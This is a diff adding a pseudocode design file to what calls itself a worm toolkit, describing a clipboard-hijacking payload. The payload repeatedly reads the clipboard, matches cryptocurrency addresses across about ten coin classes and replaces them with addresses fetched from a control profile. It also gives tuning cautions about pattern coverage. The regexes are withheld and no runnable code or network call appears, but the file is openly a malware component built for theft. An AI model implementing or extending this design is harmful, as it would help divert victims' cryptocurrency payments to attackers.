@@ -1,0 +1,32 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/payload/paste_swap.pseudo
+# Clipboard replacement for payment-network addresses.
+
+TYPE Session:
+    map: asset_class -> replacement_address   # from control.pull_profile()
+
+Session.run():
+    LOOP while running:
+        open clipboard
+        text = unicode clipboard contents
+        replaced = apply patterns
+        IF replaced != text: write clipboard
+        sleep a fraction of a second
+
+PATTERNS (classes, not the private regexes):
+    bitcoin-legacy, bitcoin-native-segwit,
+    ethereum-style, litecoin-style, monero-style, dogecoin-style,
+    solana-style, xrp-style, bnb-style, tether-tron-style
+
+CAUTIONS:
+    Some classes (especially short Base58 windows) match far more
+    than real addresses and will corrupt ordinary clipboard text.
+    A profile that only sets "bitcoin" will miss native-segwit
+    unless that class is set separately.
+
+Session.stop(): flip the running flag
